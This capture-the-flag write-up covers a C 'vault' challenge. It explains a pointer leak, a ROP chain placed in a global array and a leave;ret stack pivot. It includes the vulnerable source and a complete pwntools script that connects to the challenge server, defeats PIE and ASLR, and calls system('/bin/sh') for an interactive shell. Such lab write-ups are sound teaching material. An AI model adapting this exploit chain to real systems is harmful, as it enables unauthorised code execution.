## AquaBank Safe - Information Exposure and Stack Pivoting

We now advance our academic inquiry toward the laboratory exercise designated as AquaBank Premium Safe, which features a secure vault simulator developed in the C programming language, where the primary objective requires the circumvention of advanced memory protections, including Position Independent Executables and Address Space Layout Randomization, through a highly sophisticated multi stage exploitation strategy. Upon a rigorous inspection of the provided source code, one will immediately identify a severe **Information Exposure** vulnerability residing within the `diagnostics` function, given that the application explicitly prints the memory addresses of the standard `printf` function and its own internal `diagnostics` routine directly to the standard output. By capturing these leaked memory pointers, an exploit developer can dynamically compute the base addresses of both the C standard library and the executable itself, which effectively nullifies the randomized memory layout and permits the precise localization of necessary execution gadgets and global variables, such as the expansive uninitialized array named `vault`.

Having successfully mapped the execution environment, the attacker utilizes the `deposit` function to inject a complete Return Oriented Programming chain directly into the globally accessible `vault` structure at a predefined offset, where this specific execution chain is meticulously designed to align the stack, load the address of the command shell string into the primary argument register, and ultimately invoke the system library function. The final and most critical phase of the assessment focuses on the `open_safe` function, where the developer allocated a diminutive local character array of exactly eight bytes but subsequently invoked the `read` function to accept up to twenty four bytes of user input, which introduces a highly constrained **Buffer Overflow** condition that provides just enough space to overwrite the saved base pointer and the saved instruction pointer, but lacks the necessary volume to host a full execution chain. To overcome this spatial limitation, the exploit leverages an advanced technique known as **Stack Pivoting**, where the attacker overwrites the saved base pointer with the dynamically calculated address of the previously populated `vault` array and replaces the instruction pointer with a specific assembly gadget composed of a `leave` instruction followed by a `ret` instruction. When the vulnerable function concludes and executes its standard epilogue, the injected gadget forces the processor to abandon the current execution stack and pivot its internal registers to the forged stack located within the global data segment, which seamlessly redirects the program flow into the waiting execution chain and ultimately grants interactive administrative control over the compromised process.



```C
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

static void setup(void) {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);
}

static void banner(void) {
    puts("=== AquaBank Premium Safe ===");
    puts("PIE-protected vault.  No leaks. (Or are there?)");
}

char vault[0x4000];

static void deposit(void) {
    int n;
    printf("[deposit] Vault deposit size (bytes): ");
    if (scanf("%d", &n) != 1) return;
    int c; while ((c = getchar()) != '\n' && c != EOF) {}
    if (n < 0 || n > (int)sizeof(vault)) { puts("bad size"); return; }
    printf("[deposit] Send %d bytes:\n", n);
    (void)read(STDIN_FILENO, vault, n);
    puts("[deposit] Deposit registered.");
}

static void diagnostics(void) {
    printf("[diag] printf @ %p\n", (void*)printf);
    printf("[diag] entry  @ %p\n", (void*)&diagnostics);
}

static void open_safe(void) {
    char buf[8];
    puts("[safe] Enter the 24-byte combination:");
    (void)read(STDIN_FILENO, buf, 24);
}

static void menu(void) {
    char line[16];
    while (1) {
        puts("");
        puts("=== AquaBank Premium Safe ===");
        puts("1) Diagnostics");
        puts("2) Vault deposit");
        puts("3) Open safe");
        puts("4) Exit");
        printf("> "); fflush(stdout);
        if (!fgets(line, sizeof(line), stdin)) break;
        switch (atoi(line)) {
            case 1: diagnostics(); break;
            case 2: deposit();     break;
            case 3: open_safe();   return;
            case 4: puts("Bye");   return;
            default: puts("?");
        }
    }
}

int main(void) {
    setup();
    banner();
    menu();
    return 0;
}
```

Python

```
#!/usr/bin/env python3
from pwn import *

exe = './aquabank-safe'
context.binary = elf = ELF(exe, checksec=False)
#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
libc = ELF('./libc.so.6', checksec=False)

#p = process(elf.path)
p =remote("offsec.m0lecon.it", 13565)

# Stage 1: information leak
p.sendlineafter(b'> ', b'1')
p.recvuntil(b'printf @ ')

printf_leak = int(p.recvline().strip(), 16)

p.recvuntil(b'entry  @ ')
diag_leak = int(p.recvline().strip(), 16)

libc.address = printf_leak - libc.sym['printf']
elf.address = diag_leak - elf.sym['diagnostics']

log.success(f"Libc base: {hex(libc.address)}")
log.success(f"PIE base: {hex(elf.address)}")

vault_addr = elf.sym['vault']
log.success(f"Vault address: {hex(vault_addr)}")

# Stage 2: ROP chain
rop_libc = ROP(libc)
ret = rop_libc.find_gadget(['ret'])[0]
pop_rdi = rop_libc.find_gadget(['pop rdi', 'ret'])[0]
binsh = next(libc.search(b'/bin/sh\x00'))
system = libc.sym['system']

SAFE_OFFSET = 0x800

# La ROP Chain pronta nel vault
vault_payload = flat(
    b'A' * SAFE_OFFSET,
    p64(0),          # [vault+0x800] Finisce in RBP durante il secondo 'leave'
    p64(ret),        # [vault+0x808] Stack Alignment per MOVAPS
    p64(pop_rdi),    # [vault+0x810] Inizio della chain reale
    p64(binsh),      # [vault+0x818] Argomento
    p64(system)      # [vault+0x820] shell
)

p.sendlineafter(b'> ', b'2')
p.sendlineafter(b'size (bytes): ', str(len(vault_payload)).encode())
p.sendafter(b'bytes:\n', vault_payload)

# Stage 3: devo dire alla CPU di smettere di leggere lo stack e iniziare a leggere il vault nostro
rop_elf = ROP(elf)
leave_ret = rop_elf.find_gadget(['leave', 'ret'])[0]

pivot_payload = flat(
    b'A' * 8,                          # riempio buf[8]
    p64(vault_addr + SAFE_OFFSET),     # sovrascrivo l'RBP
    p64(leave_ret)                     # sovrascrivo RIP
)

p.sendlineafter(b'> ', b'3')

# quando open_safe() fa "return": fatto
p.sendafter(b'combination:\n', pivot_payload)
p.interactive()
```

> **Stack Pivoting:** This advanced exploitation methodology is employed when a vulnerable buffer provides insufficient contiguous space to accommodate a complete execution chain, where an attacker deliberately manipulates the base pointer and instruction pointer to force the processor to transition its operational stack to an entirely different region of memory, such as the heap or global data segment, which has been previously populated with the necessary malicious payloads.